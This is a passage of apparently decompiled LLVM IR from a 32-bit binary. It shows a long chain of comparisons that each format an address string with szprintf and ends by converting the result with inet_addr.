  %v3_100065a8 = icmp eq i32 %v2_10002f1c, 166
  br i1 %v3_100065a8, label %dec_label_pc_100065b0, label %dec_label_pc_100065f8

dec_label_pc_100065b0:                            ; preds = %dec_label_pc_100065a4
  %v2_100065b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100065c4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100065c4 = zext i8 %v3_100065c4 to i32
  %v4_100065f4 = call i32 @szprintf(i32 %v2_100065b0, i32 ptrtoint ([14 x i8]* @global_var_10016ca4.205 to i32), i32 %v4_100065c4)
  br label %dec_label_pc_100065f8

dec_label_pc_100065f8:                            ; preds = %dec_label_pc_100065a4, %dec_label_pc_100065b0
  %v3_100065fc = icmp eq i32 %v2_10002f1c, 167
  br i1 %v3_100065fc, label %dec_label_pc_10006604, label %dec_label_pc_1000664c

dec_label_pc_10006604:                            ; preds = %dec_label_pc_100065f8
  %v2_10006604 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006618 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006618 = zext i8 %v3_10006618 to i32
  %v4_10006648 = call i32 @szprintf(i32 %v2_10006604, i32 ptrtoint ([14 x i8]* @global_var_10016c44.199 to i32), i32 %v4_10006618)
  br label %dec_label_pc_1000664c

dec_label_pc_1000664c:                            ; preds = %dec_label_pc_100065f8, %dec_label_pc_10006604
  %v3_10006650 = icmp eq i32 %v2_10002f1c, 168
  br i1 %v3_10006650, label %dec_label_pc_10006658, label %dec_label_pc_100066a0

dec_label_pc_10006658:                            ; preds = %dec_label_pc_1000664c
  %v2_10006658 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000666c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000666c = zext i8 %v3_1000666c to i32
  %v4_1000669c = call i32 @szprintf(i32 %v2_10006658, i32 ptrtoint ([14 x i8]* @global_var_10016cb4.206 to i32), i32 %v4_1000666c)
  br label %dec_label_pc_100066a0

dec_label_pc_100066a0:                            ; preds = %dec_label_pc_1000664c, %dec_label_pc_10006658
  %v3_100066a4 = icmp eq i32 %v2_10002f1c, 169
  br i1 %v3_100066a4, label %dec_label_pc_100066ac, label %dec_label_pc_100066f4

dec_label_pc_100066ac:                            ; preds = %dec_label_pc_100066a0
  %v2_100066ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100066c0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100066c0 = zext i8 %v3_100066c0 to i32
  %v4_100066f0 = call i32 @szprintf(i32 %v2_100066ac, i32 ptrtoint ([14 x i8]* @global_var_10016cc4.207 to i32), i32 %v4_100066c0)
  br label %dec_label_pc_100066f4

dec_label_pc_100066f4:                            ; preds = %dec_label_pc_100066a0, %dec_label_pc_100066ac
  %v3_100066f8 = icmp eq i32 %v2_10002f1c, 171
  br i1 %v3_100066f8, label %dec_label_pc_10006700, label %dec_label_pc_10006748

dec_label_pc_10006700:                            ; preds = %dec_label_pc_100066f4
  %v2_10006700 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006714 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006714 = zext i8 %v3_10006714 to i32
  %v4_10006744 = call i32 @szprintf(i32 %v2_10006700, i32 ptrtoint ([14 x i8]* @global_var_10016cd4.208 to i32), i32 %v4_10006714)
  br label %dec_label_pc_10006748

dec_label_pc_10006748:                            ; preds = %dec_label_pc_100066f4, %dec_label_pc_10006700
  %v3_1000674c = icmp eq i32 %v2_10002f1c, 172
  br i1 %v3_1000674c, label %dec_label_pc_10006754, label %dec_label_pc_1000679c

dec_label_pc_10006754:                            ; preds = %dec_label_pc_10006748
  %v2_10006754 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006768 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006768 = zext i8 %v3_10006768 to i32
  %v4_10006798 = call i32 @szprintf(i32 %v2_10006754, i32 ptrtoint ([14 x i8]* @global_var_10016ce4.209 to i32), i32 %v4_10006768)
  br label %dec_label_pc_1000679c

dec_label_pc_1000679c:                            ; preds = %dec_label_pc_10006748, %dec_label_pc_10006754
  %v3_100067a0 = icmp eq i32 %v2_10002f1c, 173
  br i1 %v3_100067a0, label %dec_label_pc_100067a8, label %dec_label_pc_100067f0

dec_label_pc_100067a8:                            ; preds = %dec_label_pc_1000679c
  %v2_100067a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100067bc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100067bc = zext i8 %v3_100067bc to i32
  %v4_100067ec = call i32 @szprintf(i32 %v2_100067a8, i32 ptrtoint ([14 x i8]* @global_var_10016cf4.210 to i32), i32 %v4_100067bc)
  br label %dec_label_pc_100067f0

dec_label_pc_100067f0:                            ; preds = %dec_label_pc_1000679c, %dec_label_pc_100067a8
  %v3_100067f4 = icmp eq i32 %v2_10002f1c, 174
  br i1 %v3_100067f4, label %dec_label_pc_100067fc, label %dec_label_pc_10006844

dec_label_pc_100067fc:                            ; preds = %dec_label_pc_100067f0
  %v2_100067fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006810 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006810 = zext i8 %v3_10006810 to i32
  %v4_10006840 = call i32 @szprintf(i32 %v2_100067fc, i32 ptrtoint ([13 x i8]* @global_var_10016d04.211 to i32), i32 %v4_10006810)
  br label %dec_label_pc_10006844

dec_label_pc_10006844:                            ; preds = %dec_label_pc_100067f0, %dec_label_pc_100067fc
  %v3_10006848 = icmp eq i32 %v2_10002f1c, 175
  br i1 %v3_10006848, label %dec_label_pc_10006850, label %dec_label_pc_10006898

dec_label_pc_10006850:                            ; preds = %dec_label_pc_10006844
  %v2_10006850 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006864 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006864 = zext i8 %v3_10006864 to i32
  %v4_10006894 = call i32 @szprintf(i32 %v2_10006850, i32 ptrtoint ([14 x i8]* @global_var_10016d14.212 to i32), i32 %v4_10006864)
  br label %dec_label_pc_10006898

dec_label_pc_10006898:                            ; preds = %dec_label_pc_10006844, %dec_label_pc_10006850
  %v3_1000689c = icmp eq i32 %v2_10002f1c, 176
  br i1 %v3_1000689c, label %dec_label_pc_100068a4, label %dec_label_pc_100068ec

dec_label_pc_100068a4:                            ; preds = %dec_label_pc_10006898
  %v2_100068a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100068b8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100068b8 = zext i8 %v3_100068b8 to i32
  %v4_100068e8 = call i32 @szprintf(i32 %v2_100068a4, i32 ptrtoint ([14 x i8]* @global_var_10016d24.213 to i32), i32 %v4_100068b8)
  br label %dec_label_pc_100068ec

dec_label_pc_100068ec:                            ; preds = %dec_label_pc_10006898, %dec_label_pc_100068a4
  %v3_100068f0 = icmp eq i32 %v2_10002f1c, 177
  br i1 %v3_100068f0, label %dec_label_pc_100068f8, label %dec_label_pc_10006940

dec_label_pc_100068f8:                            ; preds = %dec_label_pc_100068ec
  %v2_100068f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000690c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000690c = zext i8 %v3_1000690c to i32
  %v4_1000693c = call i32 @szprintf(i32 %v2_100068f8, i32 ptrtoint ([14 x i8]* @global_var_10016d34.214 to i32), i32 %v4_1000690c)
  br label %dec_label_pc_10006940

dec_label_pc_10006940:                            ; preds = %dec_label_pc_100068ec, %dec_label_pc_100068f8
  %v3_10006944 = icmp eq i32 %v2_10002f1c, 178
  br i1 %v3_10006944, label %dec_label_pc_1000694c, label %dec_label_pc_10006994

dec_label_pc_1000694c:                            ; preds = %dec_label_pc_10006940
  %v2_1000694c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006960 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006960 = zext i8 %v3_10006960 to i32
  %v4_10006990 = call i32 @szprintf(i32 %v2_1000694c, i32 ptrtoint ([13 x i8]* @global_var_10016d44.215 to i32), i32 %v4_10006960)
  br label %dec_label_pc_10006994

dec_label_pc_10006994:                            ; preds = %dec_label_pc_10006940, %dec_label_pc_1000694c
  %v3_10006998 = icmp eq i32 %v2_10002f1c, 179
  br i1 %v3_10006998, label %dec_label_pc_100069a0, label %dec_label_pc_100069e8

dec_label_pc_100069a0:                            ; preds = %dec_label_pc_10006994
  %v2_100069a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100069b4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100069b4 = zext i8 %v3_100069b4 to i32
  %v4_100069e4 = call i32 @szprintf(i32 %v2_100069a0, i32 ptrtoint ([13 x i8]* @global_var_10016d54.216 to i32), i32 %v4_100069b4)
  br label %dec_label_pc_100069e8

dec_label_pc_100069e8:                            ; preds = %dec_label_pc_10006994, %dec_label_pc_100069a0
  %v3_100069ec = icmp eq i32 %v2_10002f1c, 180
  br i1 %v3_100069ec, label %dec_label_pc_100069f4, label %dec_label_pc_10006a3c

dec_label_pc_100069f4:                            ; preds = %dec_label_pc_100069e8
  %v2_100069f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a08 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006a08 = zext i8 %v3_10006a08 to i32
  %v4_10006a38 = call i32 @szprintf(i32 %v2_100069f4, i32 ptrtoint ([13 x i8]* @global_var_10016d64.217 to i32), i32 %v4_10006a08)
  br label %dec_label_pc_10006a3c

dec_label_pc_10006a3c:                            ; preds = %dec_label_pc_100069e8, %dec_label_pc_100069f4
  %v3_10006a40 = icmp eq i32 %v2_10002f1c, 181
  br i1 %v3_10006a40, label %dec_label_pc_10006a48, label %dec_label_pc_10006a90

dec_label_pc_10006a48:                            ; preds = %dec_label_pc_10006a3c
  %v2_10006a48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a5c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006a5c = zext i8 %v3_10006a5c to i32
  %v4_10006a8c = call i32 @szprintf(i32 %v2_10006a48, i32 ptrtoint ([13 x i8]* @global_var_10016d74.218 to i32), i32 %v4_10006a5c)
  br label %dec_label_pc_10006a90

dec_label_pc_10006a90:                            ; preds = %dec_label_pc_10006a3c, %dec_label_pc_10006a48
  %v3_10006a94 = icmp eq i32 %v2_10002f1c, 182
  br i1 %v3_10006a94, label %dec_label_pc_10006a9c, label %dec_label_pc_10006ae4

dec_label_pc_10006a9c:                            ; preds = %dec_label_pc_10006a90
  %v2_10006a9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ab0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006ab0 = zext i8 %v3_10006ab0 to i32
  %v4_10006ae0 = call i32 @szprintf(i32 %v2_10006a9c, i32 ptrtoint ([13 x i8]* @global_var_10016d84.219 to i32), i32 %v4_10006ab0)
  br label %dec_label_pc_10006ae4

dec_label_pc_10006ae4:                            ; preds = %dec_label_pc_10006a90, %dec_label_pc_10006a9c
  %v3_10006ae8 = icmp eq i32 %v2_10002f1c, 183
  br i1 %v3_10006ae8, label %dec_label_pc_10006af0, label %dec_label_pc_10006b38

dec_label_pc_10006af0:                            ; preds = %dec_label_pc_10006ae4
  %v2_10006af0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b04 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006b04 = zext i8 %v3_10006b04 to i32
  %v4_10006b34 = call i32 @szprintf(i32 %v2_10006af0, i32 ptrtoint ([13 x i8]* @global_var_10016584.90 to i32), i32 %v4_10006b04)
  br label %dec_label_pc_10006b38

dec_label_pc_10006b38:                            ; preds = %dec_label_pc_10006ae4, %dec_label_pc_10006af0
  %v3_10006b3c = icmp eq i32 %v2_10002f1c, 184
  br i1 %v3_10006b3c, label %dec_label_pc_10006b44, label %dec_label_pc_10006b8c

dec_label_pc_10006b44:                            ; preds = %dec_label_pc_10006b38
  %v2_10006b44 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b58 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006b58 = zext i8 %v3_10006b58 to i32
  %v4_10006b88 = call i32 @szprintf(i32 %v2_10006b44, i32 ptrtoint ([13 x i8]* @global_var_10016d94.220 to i32), i32 %v4_10006b58)
  br label %dec_label_pc_10006b8c

dec_label_pc_10006b8c:                            ; preds = %dec_label_pc_10006b38, %dec_label_pc_10006b44
  %v3_10006b90 = icmp eq i32 %v2_10002f1c, 185
  br i1 %v3_10006b90, label %dec_label_pc_10006b98, label %dec_label_pc_10006be0

dec_label_pc_10006b98:                            ; preds = %dec_label_pc_10006b8c
  %v2_10006b98 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006bac = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006bac = zext i8 %v3_10006bac to i32
  %v4_10006bdc = call i32 @szprintf(i32 %v2_10006b98, i32 ptrtoint ([13 x i8]* @global_var_10016da4.221 to i32), i32 %v4_10006bac)
  br label %dec_label_pc_10006be0

dec_label_pc_10006be0:                            ; preds = %dec_label_pc_10006b8c, %dec_label_pc_10006b98
  %v3_10006be4 = icmp eq i32 %v2_10002f1c, 186
  br i1 %v3_10006be4, label %dec_label_pc_10006bec, label %dec_label_pc_10006c34

dec_label_pc_10006bec:                            ; preds = %dec_label_pc_10006be0
  %v2_10006bec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c00 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006c00 = zext i8 %v3_10006c00 to i32
  %v4_10006c30 = call i32 @szprintf(i32 %v2_10006bec, i32 ptrtoint ([14 x i8]* @global_var_10016db4.222 to i32), i32 %v4_10006c00)
  br label %dec_label_pc_10006c34

dec_label_pc_10006c34:                            ; preds = %dec_label_pc_10006be0, %dec_label_pc_10006bec
  %v3_10006c38 = icmp eq i32 %v2_10002f1c, 187
  br i1 %v3_10006c38, label %dec_label_pc_10006c40, label %dec_label_pc_10006c88

dec_label_pc_10006c40:                            ; preds = %dec_label_pc_10006c34
  %v2_10006c40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c54 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006c54 = zext i8 %v3_10006c54 to i32
  %v4_10006c84 = call i32 @szprintf(i32 %v2_10006c40, i32 ptrtoint ([14 x i8]* @global_var_10016dc4.223 to i32), i32 %v4_10006c54)
  br label %dec_label_pc_10006c88

dec_label_pc_10006c88:                            ; preds = %dec_label_pc_10006c34, %dec_label_pc_10006c40
  %v3_10006c8c = icmp eq i32 %v2_10002f1c, 188
  br i1 %v3_10006c8c, label %dec_label_pc_10006c94, label %dec_label_pc_10006cdc

dec_label_pc_10006c94:                            ; preds = %dec_label_pc_10006c88
  %v2_10006c94 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ca8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006ca8 = zext i8 %v3_10006ca8 to i32
  %v4_10006cd8 = call i32 @szprintf(i32 %v2_10006c94, i32 ptrtoint ([14 x i8]* @global_var_10016dd4.224 to i32), i32 %v4_10006ca8)
  br label %dec_label_pc_10006cdc

dec_label_pc_10006cdc:                            ; preds = %dec_label_pc_10006c88, %dec_label_pc_10006c94
  %v3_10006ce0 = icmp eq i32 %v2_10002f1c, 189
  br i1 %v3_10006ce0, label %dec_label_pc_10006ce8, label %dec_label_pc_10006d30

dec_label_pc_10006ce8:                            ; preds = %dec_label_pc_10006cdc
  %v2_10006ce8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006cfc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006cfc = zext i8 %v3_10006cfc to i32
  %v4_10006d2c = call i32 @szprintf(i32 %v2_10006ce8, i32 ptrtoint ([14 x i8]* @global_var_10016de4.225 to i32), i32 %v4_10006cfc)
  br label %dec_label_pc_10006d30

dec_label_pc_10006d30:                            ; preds = %dec_label_pc_10006cdc, %dec_label_pc_10006ce8
  %v3_10006d34 = icmp eq i32 %v2_10002f1c, 190
  br i1 %v3_10006d34, label %dec_label_pc_10006d3c, label %dec_label_pc_10006d84

dec_label_pc_10006d3c:                            ; preds = %dec_label_pc_10006d30
  %v2_10006d3c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d50 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006d50 = zext i8 %v3_10006d50 to i32
  %v4_10006d80 = call i32 @szprintf(i32 %v2_10006d3c, i32 ptrtoint ([14 x i8]* @global_var_10016df4.226 to i32), i32 %v4_10006d50)
  br label %dec_label_pc_10006d84

dec_label_pc_10006d84:                            ; preds = %dec_label_pc_10006d30, %dec_label_pc_10006d3c
  %v3_10006d88 = icmp eq i32 %v2_10002f1c, 191
  br i1 %v3_10006d88, label %dec_label_pc_10006d90, label %dec_label_pc_10006dd8

dec_label_pc_10006d90:                            ; preds = %dec_label_pc_10006d84
  %v2_10006d90 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006da4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006da4 = zext i8 %v3_10006da4 to i32
  %v4_10006dd4 = call i32 @szprintf(i32 %v2_10006d90, i32 ptrtoint ([14 x i8]* @global_var_10016e04.227 to i32), i32 %v4_10006da4)
  br label %dec_label_pc_10006dd8

dec_label_pc_10006dd8:                            ; preds = %dec_label_pc_10006d84, %dec_label_pc_10006d90
  %v3_10006ddc = icmp eq i32 %v2_10002f1c, 192
  br i1 %v3_10006ddc, label %dec_label_pc_10006de4, label %dec_label_pc_10006e2c

dec_label_pc_10006de4:                            ; preds = %dec_label_pc_10006dd8
  %v2_10006de4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006df8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006df8 = zext i8 %v3_10006df8 to i32
  %v4_10006e28 = call i32 @szprintf(i32 %v2_10006de4, i32 ptrtoint ([13 x i8]* @global_var_10016e14.228 to i32), i32 %v4_10006df8)
  br label %dec_label_pc_10006e2c

dec_label_pc_10006e2c:                            ; preds = %dec_label_pc_10006dd8, %dec_label_pc_10006de4
  %v3_10006e30 = icmp eq i32 %v2_10002f1c, 193
  br i1 %v3_10006e30, label %dec_label_pc_10006e38, label %dec_label_pc_10006e80

dec_label_pc_10006e38:                            ; preds = %dec_label_pc_10006e2c
  %v2_10006e38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006e4c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006e4c = zext i8 %v3_10006e4c to i32
  %v4_10006e7c = call i32 @szprintf(i32 %v2_10006e38, i32 ptrtoint ([13 x i8]* @global_var_10016e24.229 to i32), i32 %v4_10006e4c)
  br label %dec_label_pc_10006e80

dec_label_pc_10006e80:                            ; preds = %dec_label_pc_10006e2c, %dec_label_pc_10006e38
  %v3_10006e84 = icmp eq i32 %v2_10002f1c, 194
  br i1 %v3_10006e84, label %dec_label_pc_10006e8c, label %dec_label_pc_10006ed4

dec_label_pc_10006e8c:                            ; preds = %dec_label_pc_10006e80
  %v2_10006e8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ea0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006ea0 = zext i8 %v3_10006ea0 to i32
  %v4_10006ed0 = call i32 @szprintf(i32 %v2_10006e8c, i32 ptrtoint ([14 x i8]* @global_var_10016e34.230 to i32), i32 %v4_10006ea0)
  br label %dec_label_pc_10006ed4

dec_label_pc_10006ed4:                            ; preds = %dec_label_pc_10006e80, %dec_label_pc_10006e8c
  %v3_10006ed8 = icmp eq i32 %v2_10002f1c, 195
  br i1 %v3_10006ed8, label %dec_label_pc_10006ee0, label %dec_label_pc_10006f28

dec_label_pc_10006ee0:                            ; preds = %dec_label_pc_10006ed4
  %v2_10006ee0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ef4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006ef4 = zext i8 %v3_10006ef4 to i32
  %v4_10006f24 = call i32 @szprintf(i32 %v2_10006ee0, i32 ptrtoint ([14 x i8]* @global_var_10016e44.231 to i32), i32 %v4_10006ef4)
  br label %dec_label_pc_10006f28

dec_label_pc_10006f28:                            ; preds = %dec_label_pc_10006ed4, %dec_label_pc_10006ee0
  %v3_10006f2c = icmp eq i32 %v2_10002f1c, 196
  br i1 %v3_10006f2c, label %dec_label_pc_10006f34, label %dec_label_pc_10006f7c

dec_label_pc_10006f34:                            ; preds = %dec_label_pc_10006f28
  %v2_10006f34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f48 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006f48 = zext i8 %v3_10006f48 to i32
  %v4_10006f78 = call i32 @szprintf(i32 %v2_10006f34, i32 ptrtoint ([14 x i8]* @global_var_10016e54.232 to i32), i32 %v4_10006f48)
  br label %dec_label_pc_10006f7c

dec_label_pc_10006f7c:                            ; preds = %dec_label_pc_10006f28, %dec_label_pc_10006f34
  %v3_10006f80 = icmp eq i32 %v2_10002f1c, 197
  br i1 %v3_10006f80, label %dec_label_pc_10006f88, label %dec_label_pc_10006fd0

dec_label_pc_10006f88:                            ; preds = %dec_label_pc_10006f7c
  %v2_10006f88 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f9c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006f9c = zext i8 %v3_10006f9c to i32
  %v4_10006fcc = call i32 @szprintf(i32 %v2_10006f88, i32 ptrtoint ([14 x i8]* @global_var_10016e64.233 to i32), i32 %v4_10006f9c)
  br label %dec_label_pc_10006fd0

dec_label_pc_10006fd0:                            ; preds = %dec_label_pc_10006f7c, %dec_label_pc_10006f88
  %v3_10006fd4 = icmp eq i32 %v2_10002f1c, 198
  br i1 %v3_10006fd4, label %dec_label_pc_10006fdc, label %dec_label_pc_10007024

dec_label_pc_10006fdc:                            ; preds = %dec_label_pc_10006fd0
  %v2_10006fdc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ff0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006ff0 = zext i8 %v3_10006ff0 to i32
  %v4_10007020 = call i32 @szprintf(i32 %v2_10006fdc, i32 ptrtoint ([14 x i8]* @global_var_10016e74.234 to i32), i32 %v4_10006ff0)
  br label %dec_label_pc_10007024

dec_label_pc_10007024:                            ; preds = %dec_label_pc_10006fd0, %dec_label_pc_10006fdc
  %v3_10007028 = icmp eq i32 %v2_10002f1c, 199
  br i1 %v3_10007028, label %dec_label_pc_10007030, label %dec_label_pc_10007078

dec_label_pc_10007030:                            ; preds = %dec_label_pc_10007024
  %v2_10007030 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007044 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10007044 = zext i8 %v3_10007044 to i32
  %v4_10007074 = call i32 @szprintf(i32 %v2_10007030, i32 ptrtoint ([14 x i8]* @global_var_10016e84.235 to i32), i32 %v4_10007044)
  br label %dec_label_pc_10007078

dec_label_pc_10007078:                            ; preds = %dec_label_pc_10007024, %dec_label_pc_10007030
  %v3_1000707c = icmp eq i32 %v2_10002f1c, 200
  br i1 %v3_1000707c, label %dec_label_pc_10007084, label %dec_label_pc_100070cc

dec_label_pc_10007084:                            ; preds = %dec_label_pc_10007078
  %v2_10007084 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007098 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10007098 = zext i8 %v3_10007098 to i32
  %v4_100070c8 = call i32 @szprintf(i32 %v2_10007084, i32 ptrtoint ([14 x i8]* @global_var_10016e94.236 to i32), i32 %v4_10007098)
  br label %dec_label_pc_100070cc

dec_label_pc_100070cc:                            ; preds = %dec_label_pc_10007078, %dec_label_pc_10007084
  %v3_100070d0 = icmp eq i32 %v2_10002f1c, 201
  br i1 %v3_100070d0, label %dec_label_pc_1000712c, label %dec_label_pc_10007120

dec_label_pc_10007120:                            ; preds = %dec_label_pc_100070cc
  br label %dec_label_pc_10007174

dec_label_pc_1000712c:                            ; preds = %dec_label_pc_100070cc
  %v2_100070d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100070ec = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100070ec = zext i8 %v3_100070ec to i32
  %v4_1000711c = call i32 @szprintf(i32 %v2_100070d8, i32 ptrtoint ([14 x i8]* @global_var_10016ea4.237 to i32), i32 %v4_100070ec)
  %v3_10007140 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10007140 = zext i8 %v3_10007140 to i32
  %v4_10007170 = call i32 @szprintf(i32 %v2_100070d8, i32 ptrtoint ([13 x i8]* @global_var_10016eb4.238 to i32), i32 %v4_10007140)
  br label %dec_label_pc_10007174

dec_label_pc_10007174:                            ; preds = %dec_label_pc_10007120, %dec_label_pc_1000712c
  %v3_10007178 = icmp eq i32 %v2_10002f1c, 202
  br i1 %v3_10007178, label %dec_label_pc_10007180, label %dec_label_pc_100071c8

dec_label_pc_10007180:                            ; preds = %dec_label_pc_10007174
  %v2_10007180 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007194 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10007194 = zext i8 %v3_10007194 to i32
  %v4_100071c4 = call i32 @szprintf(i32 %v2_10007180, i32 ptrtoint ([13 x i8]* @global_var_10016ec4.239 to i32), i32 %v4_10007194)
  br label %dec_label_pc_100071c8

dec_label_pc_100071c8:                            ; preds = %dec_label_pc_10007174, %dec_label_pc_10007180
  %v3_100071cc = icmp eq i32 %v2_10002f1c, 203
  br i1 %v3_100071cc, label %dec_label_pc_100071d4, label %dec_label_pc_1000721c

dec_label_pc_100071d4:                            ; preds = %dec_label_pc_100071c8
  %v2_100071d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100071e8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100071e8 = zext i8 %v3_100071e8 to i32
  %v4_10007218 = call i32 @szprintf(i32 %v2_100071d4, i32 ptrtoint ([13 x i8]* @global_var_10016ed4.240 to i32), i32 %v4_100071e8)
  br label %dec_label_pc_1000721c

dec_label_pc_1000721c:                            ; preds = %dec_label_pc_100071c8, %dec_label_pc_100071d4
  %v3_10007220 = icmp eq i32 %v2_10002f1c, 204
  br i1 %v3_10007220, label %dec_label_pc_10007228, label %dec_label_pc_10007270

dec_label_pc_10007228:                            ; preds = %dec_label_pc_1000721c
  %v2_10007228 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000723c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000723c = zext i8 %v3_1000723c to i32
  %v4_1000726c = call i32 @szprintf(i32 %v2_10007228, i32 ptrtoint ([13 x i8]* @global_var_10016ee4.241 to i32), i32 %v4_1000723c)
  br label %dec_label_pc_10007270

dec_label_pc_10007270:                            ; preds = %dec_label_pc_1000721c, %dec_label_pc_10007228
  %v3_10007274 = icmp eq i32 %v2_10002f1c, 205
  br i1 %v3_10007274, label %dec_label_pc_1000727c, label %dec_label_pc_100072c4

dec_label_pc_1000727c:                            ; preds = %dec_label_pc_10007270
  %v2_1000727c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007290 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10007290 = zext i8 %v3_10007290 to i32
  %v4_100072c0 = call i32 @szprintf(i32 %v2_1000727c, i32 ptrtoint ([13 x i8]* @global_var_10016ef4.242 to i32), i32 %v4_10007290)
  br label %dec_label_pc_100072c4

dec_label_pc_100072c4:                            ; preds = %dec_label_pc_10007270, %dec_label_pc_1000727c
  %v3_100072c8 = icmp eq i32 %v2_10002f1c, 206
  br i1 %v3_100072c8, label %dec_label_pc_100072d0, label %dec_label_pc_10007318

dec_label_pc_100072d0:                            ; preds = %dec_label_pc_100072c4
  %v2_100072d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100072e4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100072e4 = zext i8 %v3_100072e4 to i32
  %v4_10007314 = call i32 @szprintf(i32 %v2_100072d0, i32 ptrtoint ([13 x i8]* @global_var_10016f04.243 to i32), i32 %v4_100072e4)
  br label %dec_label_pc_10007318

dec_label_pc_10007318:                            ; preds = %dec_label_pc_100072c4, %dec_label_pc_100072d0
  %v3_1000731c = icmp eq i32 %v2_10002f1c, 207
  %v2_10007324 = ptrtoint i32* %stack_var_-52 to i32
  br i1 %v3_1000731c, label %dec_label_pc_10007324, label %dec_label_pc_1000736c

dec_label_pc_10007324:                            ; preds = %dec_label_pc_10007318
  %v3_10007338 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10007338 = zext i8 %v3_10007338 to i32
  %v4_10007368 = call i32 @szprintf(i32 %v2_10007324, i32 ptrtoint ([14 x i8]* @global_var_10016f14.244 to i32), i32 %v4_10007338)
  br label %dec_label_pc_1000736c

dec_label_pc_1000736c:                            ; preds = %dec_label_pc_10007318, %dec_label_pc_10007324
  br i1 false, label %dec_label_pc_10007378, label %dec_label_pc_100073c0

dec_label_pc_10007378:                            ; preds = %dec_label_pc_1000736c
  br label %dec_label_pc_100073c0

dec_label_pc_100073c0:                            ; preds = %dec_label_pc_1000736c, %dec_label_pc_10007378
  store i32 268465100, i32* @lr, align 4
  %v1_100073c8 = call i32 @inet_addr(i32 %v2_10007324)
  ret i32 %v1_100073c8

; uselistorder directives
  uselistorder label %dec_label_pc_100073c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000736c, { 1, 0 }
  uselistorder label %dec_label_pc_10007318, { 1, 0 }
  uselistorder label %dec_label_pc_100072c4, { 1, 0 }
  uselistorder label %dec_label_pc_10007270, { 1, 0 }
  uselistorder label %dec_label_pc_1000721c, { 1, 0 }
  uselistorder label %dec_label_pc_100071c8, { 1, 0 }
  uselistorder label %dec_label_pc_10007174, { 1, 0 }
